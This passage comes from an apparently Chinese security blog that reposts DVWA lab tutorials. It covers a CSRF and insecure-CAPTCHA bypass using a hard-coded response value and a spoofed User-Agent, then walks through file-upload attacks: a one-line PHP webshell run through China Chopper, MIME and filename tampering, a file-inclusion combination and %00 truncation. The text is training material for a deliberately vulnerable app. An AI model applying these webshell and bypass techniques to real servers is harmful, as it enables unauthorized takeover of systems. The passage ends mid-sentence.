value=&quot;2&quot;&gt;       &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;        &lt;/form&gt;          &lt;/div&gt;&lt;/body&gt;        &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>当受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器。</p><p><a href="http://image.3001.net/images/20161110/14787633444694.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787633444694.png!small" alt="1.png"></a></p><p>不过依然会跳转到更改密码成功的界面。</p><p><a href="http://image.3001.net/images/20161110/14787633769617.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787633769617.png!small" alt="1.png"></a></p><h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Change'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form </span></span><br><span class="line">    $hide_form = <span class="keyword">true</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $pass_new  = $_POST[ <span class="string">'password_new'</span> ]; </span><br><span class="line">    $pass_conf = $_POST[ <span class="string">'password_conf'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party </span></span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ <span class="string">'recaptcha_private_key'</span> ], </span><br><span class="line">        $_SERVER[ <span class="string">'REMOTE_ADDR'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_challenge_field'</span> ], </span><br><span class="line">        $_POST[ <span class="string">'recaptcha_response_field'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail? </span></span><br><span class="line">    <span class="keyword">if</span>( !$resp-&gt;is_valid &amp;&amp; ( $_POST[ <span class="string">'recaptcha_response_field'</span> ] != <span class="string">'hidd3n_valu3'</span> || $_SERVER[ <span class="string">'HTTP_USER_AGENT'</span> ] != <span class="string">'reCAPTCHA'</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly </span></span><br><span class="line">        $html     .= <span class="string">"&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;"</span>; </span><br><span class="line">        $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        <span class="keyword">return</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match? </span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123; </span><br><span class="line">            $pass_new = mysql_real_escape_string( $pass_new ); </span><br><span class="line">            $pass_new = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update database </span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"' LIMIT 1;"</span>; </span><br><span class="line">            $result = mysql_query( $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for user </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Ops. Password mismatch </span></span><br><span class="line">            $html     .= <span class="string">"&lt;pre&gt;Both passwords must match.&lt;/pre&gt;"</span>; </span><br><span class="line">            $hide_form = <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，服务器的验证逻辑是当$resp（这里是指谷歌返回的验证结果）是false，并且参数recaptcha_response_field不等于hidd3n_valu3（或者http包头的User-Agent参数不等于reCAPTCHA）时，就认为验证码输入错误，反之则认为已经通过了验证码的检查。</p><h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>搞清楚了验证逻辑，剩下就是伪造绕过了，由于$resp参数我们无法控制，所以重心放在参数recaptcha_response_field、User-Agent上。</p><p>第一步依旧是抓包：</p><p><a href="http://image.3001.net/images/20161110/14787634573020.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787634573020.png!small" alt="1.png"></a></p><p>更改参数recaptcha_response_field以及http包头的User-Agent：</p><p><a href="http://image.3001.net/images/20161110/14787634878111.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787634878111.png!small" alt="1.png"></a></p><p>密码修改成功：</p><p><a href="http://image.3001.net/images/20161110/14787635158708.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787635158708.png!small" alt="1.png"></a></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a><strong>Impossible</strong></h2><p>服务器端核心代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">if( isset( $_POST[ &apos;Change&apos; ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); </span><br><span class="line"></span><br><span class="line">    // Hide the CAPTCHA form </span><br><span class="line">    $hide_form = true; </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    $pass_new  = $_POST[ &apos;password_new&apos; ]; </span><br><span class="line">    $pass_new  = stripslashes( $pass_new ); </span><br><span class="line">    $pass_new  = mysql_real_escape_string( $pass_new ); </span><br><span class="line">    $pass_new  = md5( $pass_new ); </span><br><span class="line"></span><br><span class="line">    $pass_conf = $_POST[ &apos;password_conf&apos; ]; </span><br><span class="line">    $pass_conf = stripslashes( $pass_conf ); </span><br><span class="line">    $pass_conf = mysql_real_escape_string( $pass_conf ); </span><br><span class="line">    $pass_conf = md5( $pass_conf ); </span><br><span class="line"></span><br><span class="line">    $pass_curr = $_POST[ &apos;password_current&apos; ]; </span><br><span class="line">    $pass_curr = stripslashes( $pass_curr ); </span><br><span class="line">    $pass_curr = mysql_real_escape_string( $pass_curr ); </span><br><span class="line">    $pass_curr = md5( $pass_curr ); </span><br><span class="line"></span><br><span class="line">    // Check CAPTCHA from 3rd party </span><br><span class="line">    $resp = recaptcha_check_answer( $_DVWA[ &apos;recaptcha_private_key&apos; ], </span><br><span class="line">        $_SERVER[ &apos;REMOTE_ADDR&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_challenge_field&apos; ], </span><br><span class="line">        $_POST[ &apos;recaptcha_response_field&apos; ] ); </span><br><span class="line"></span><br><span class="line">    // Did the CAPTCHA fail? </span><br><span class="line">    if( !$resp-&gt;is_valid ) &#123; </span><br><span class="line">        // What happens when the CAPTCHA was entered incorrectly </span><br><span class="line">        echo &quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">        $hide_form = false; </span><br><span class="line">        return; </span><br><span class="line">    &#125; </span><br><span class="line">    else &#123; </span><br><span class="line">        // Check that the current password is correct </span><br><span class="line">        $data = $db-&gt;prepare( &apos;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&apos; ); </span><br><span class="line">        $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;bindParam( &apos;:password&apos;, $pass_curr, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">        // Do both new password match and was the current password correct? </span><br><span class="line">        if( ( $pass_new == $pass_conf) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; </span><br><span class="line">            // Update the database </span><br><span class="line">            $data = $db-&gt;prepare( &apos;UPDATE users SET password = (:password) WHERE user = (:user);&apos; ); </span><br><span class="line">            $data-&gt;bindParam( &apos;:password&apos;, $pass_new, PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;bindParam( &apos;:user&apos;, dvwaCurrentUser(), PDO::PARAM_STR ); </span><br><span class="line">            $data-&gt;execute(); </span><br><span class="line"></span><br><span class="line">            // Feedback for the end user - success! </span><br><span class="line">            echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; </span><br><span class="line">        &#125; </span><br><span class="line">        else &#123; </span><br><span class="line">            // Feedback for the end user - failed! </span><br><span class="line">            echo &quot;&lt;pre&gt;Either your current password is incorrect or the new passwords did not match.&lt;br /&gt;Please try again.&lt;/pre&gt;&quot;; </span><br><span class="line">            $hide_form = false; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码增加了Anti-CSRF token 机制防御CSRF攻击，利用PDO技术防护sql注入，验证过程终于不再分成两部分了，验证码无法绕过，同时要求用户输入之前的密码，进一步加强了身份认证。</p><p><a href="http://image.3001.net/images/20161110/14787635805191.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161110/14787635805191.png!small" alt="1.png"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="DVWA教程" scheme="http://wlfsky.com/tags/DVWA%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>DVWA之File Upload</title>
    <link href="http://wlfsky.com/2018/01/19/DVWA%E4%B9%8BFile-Upload/"/>
    <id>http://wlfsky.com/2018/01/19/DVWA之File-Upload/</id>
    <published>2018-01-19T07:54:54.000Z</published>
    <updated>2018-01-19T08:29:58.969Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><p><strong><em>本文转载自 FreeBuf.COM：lonehand</em></strong></p><h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a><strong>DVWA简介</strong></h2><p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><p>DVWA共有十个模块，分别是</p><blockquote><p>Brute Force（蛮力攻击）</p><p>Command Injection（命令行注入）</p><p>CSRF（跨站请求伪造）</p><p>File Inclusion（文件包含）</p><p>File Upload（文件上传）</p><p>Insecure CAPTCHA （不安全的验证码）</p><p>SQL Injection（SQL注入）</p><p>SQL Injection（Blind）（SQL盲注）</p><p>XSS（Reflected）（反射型跨站脚本）</p><p>XSS（Stored）（存储型跨站脚本）</p></blockquote><p>需要注意的是，DVWA 1.9的代码分为四种安全级别：Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p><p><img src="/img/dvwa-sql-1.png" alt="dvwa-sql-1.png"></p><h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a><strong>File Upload</strong></h2><p>File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p><p><a href="http://image.3001.net/images/20161108/14785910509354.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785910509354.png!small" alt="1.png"></a></p><p>下面对四种级别的代码进行分析。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a><strong>Low</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123; </span><br><span class="line">        <span class="comment">// No </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Yes! </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em>basename(path,suffix)</em> </p><p>函数返回路径中的文件名部分，如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。</p><p>可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。不幸的是，这里三个条件全都满足。</p><p>上传文件hack.php（一句话木马）</p><p><a href="http://image.3001.net/images/20161108/14785912161713.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785912161713.png!small" alt="1.png"></a></p><p>上传成功，并且返回了上传路径</p><p><a href="http://image.3001.net/images/20161108/1478591243183.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/1478591243183.png!small" alt="1.png"></a></p><p>打开中国菜刀，右键添加，</p><p>地址栏填入上传文件所在路径<a href="">http://192.168.153.130/dvwa/hackable/uploads/hack.php</a></p><p>参数名（一句话木马口令）为apple。</p><p><a href="http://image.3001.net/images/20161108/14785912718652.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785912718652.png!small" alt="1.png"></a></p><p>然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。</p><p>可以下载、修改服务器的所有文件。</p><p><a href="http://image.3001.net/images/20161108/14785913093285.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785913093285.png!small" alt="1.png"></a></p><p>可以打开服务器的虚拟终端。</p><p><a href="http://image.3001.net/images/20161108/1478591344486.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/1478591344486.png!small" alt="1.png"></a> </p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a><strong>Medium</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Medium级别的代码对上传文件的类型、大小做了限制，要求文件类型必须是jpeg或者png，大小不能超过100000B（约为97.6KB）。</p><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>1.组合拳（文件包含+文件上传）</p><p>因为采用的是一句话木马，所以文件大小不会有问题，至于文件类型的检查，尝试修改文件名为hack.png。</p><p><a href="http://image.3001.net/images/20161108/14785914897497.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785914897497.png!small" alt="1.png"></a></p><p>上传成功。</p><p><a href="http://image.3001.net/images/20161108/14785915166863.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785915166863.png!small" alt="1.png"></a></p><p>启用中国菜刀。</p><p><a href="http://image.3001.net/images/20161108/14785915463508.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785915463508.png!small" alt="1.png"></a></p><p>不幸的是，虽然成功上传了文件，但是并不能成功获取webshell权限，在菜刀上无论进行什么操作都会返回如下信息。</p><p><a href="http://image.3001.net/images/20161108/14785915747624.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785915747624.png!small" alt="1.png"></a></p><p>中国菜刀的原理是向上传文件发送包含apple参数的post请求，通过控制apple参数来执行不同的命令，而这里服务器将木马文件解析成了图片文件，因此向其发送post请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p><p>那么如何让服务器将其解析为php文件呢？我们想到文件包含漏洞（详见文件包含漏洞教程）。这里可以借助Medium级别的文件包含漏洞来获取webshell权限，打开中国菜刀，右键添加，在地址栏中输入</p><p><a href="">http://192.168.153.130/dvwa/vulnerabilities/fi/?page=hthttp://tp://192.168.153.130/dvwa/hackable/uploads/hack.png</a></p><p>参数名为apple，</p><p>脚本语言选择php。</p><p><a href="http://image.3001.net/images/20161108/14785916187951.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785916187951.png!small" alt="1.png"></a></p><p>点击添加，成功获取webshell权限。</p><p><a href="http://image.3001.net/images/20161108/14785916447119.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785916447119.png!small" alt="1.png"></a></p><p>2.抓包修改文件类型</p><p>上传hack.png文件，抓包。</p><p><a href="http://image.3001.net/images/20161108/14785916693261.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785916693261.png!small" alt="1.png"></a></p><p>可以看到文件类型为image/png，尝试修改filename为hack.php。</p><p><a href="http://image.3001.net/images/20161108/14785917089423.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785917089423.png!small" alt="1.png"></a></p><p>上传成功。</p><p><a href="http://image.3001.net/images/20161108/14785917335700.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785917335700.png!small" alt="1.png"></a></p><p>上菜刀，获取webshell权限。</p><p><a href="http://image.3001.net/images/20161108/14785917654899.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785917654899.png!small" alt="1.png"></a></p><p>3.截断绕过规则</p><p>在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00截断，所以可以把上传文件命名为hack.php%00.png。</p><p>可以看到，包中的文件类型为image/png，可以通过文件类型检查。</p><p><a href="http://image.3001.net/images/20161108/14785917905285.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785917905285.png!small" alt="1.png"></a></p><p>上传成功。</p><p><a href="http://image.3001.net/images/20161108/14785918184375.png" target="_blank" rel="noopener"><img src="http://image.3001.net/images/20161108/14785918184375.png!small" alt="1.png"></a></p><p>而服务器会认为其文件名为hack.php，顺势解析为php文件。遗憾的是，由于本次实验环境的php版本为5.4.31，所以无法进行验证。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>); </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    $uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( $uploaded_tmp ) ) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em>strrpos(string,find,start)</em></p><p>函数返回字符串find在另一字符串string中最后一次出现的位置，如果没有找到字符串则返回false，可选参数start规定在何处开始搜索。</p><p><em>getimagesize(string 